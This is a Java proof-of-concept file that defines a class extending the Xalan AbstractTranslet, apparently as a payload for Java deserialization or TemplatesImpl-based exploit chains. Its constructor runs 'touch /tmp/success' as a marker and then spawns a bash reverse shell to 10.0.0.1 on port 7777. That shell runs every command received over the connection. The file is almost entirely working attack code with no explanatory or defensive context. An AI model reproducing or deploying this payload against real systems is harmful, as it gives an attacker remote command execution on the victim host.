import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Poc extends AbstractTranslet {

    public Poc() throws IOException {
        Runtime.getRuntime().exec("touch /tmp/success");
        Runtime r = Runtime.getRuntime();
        Process p = r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/7777;cat <&5 | while read line; do $line 2>&5 >&5; done"});
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }

    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers) throws TransletException {

    }

    public static void main(String[] args) throws Exception {
        Poc t = new Poc();
    }
}